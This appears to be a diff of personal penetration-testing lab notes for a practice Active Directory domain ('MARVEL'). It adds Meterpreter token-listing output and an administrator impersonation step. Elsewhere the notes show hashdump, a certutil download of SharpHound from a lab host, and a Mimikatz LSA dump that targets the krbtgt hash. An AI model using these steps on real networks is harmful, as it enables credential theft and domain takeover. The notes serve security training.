@@ -68,11 +68,33 @@ set payload windows/x64/meterpreter/reverse_tcp
 meterpreter > migrate 1388
 [*] Migrating from 4924 to 1388...
 [*] Migration completed successfully.
+
+OR rev2self
+
+
 meterpreter > hashdump
 sysinfo
 
 
 meterpreter> load incognito
+meterpreter > load incognito
+Loading extension incognito...Success.
+meterpreter > list_tokens -u
+
+Delegation Tokens Available
+========================================
+Font Driver Host\UMFD-0
+Font Driver Host\UMFD-1
+MARVEL\fcastle
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+Window Manager\DWM-1
+
+Impersonation Tokens Available
+========================================
+No tokens available
+
 impersonate_token marvel\\fcastle
 shell
 whoami
@@ -84,10 +106,14 @@ certutil -urlcache -f http://192.168.0.27/SharpHound.ps1 SharpHound.ps1
 
 load mimikatz
 [!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
+help kiwi
 Invoke-Mimikatz -Command '"priviliege::debug" "LSADump::LSA /inject" exit' -Computer HYDRA.marvel.local
 kerberos hash -> RID + NTLM + User: krbtgt
 
 meterpreter > list_tokens -u
+
+
+meterpreter > impersonate_token marvel\\administrator
 
 MITIGATION FOR TOKEN IMPERSONATION
 
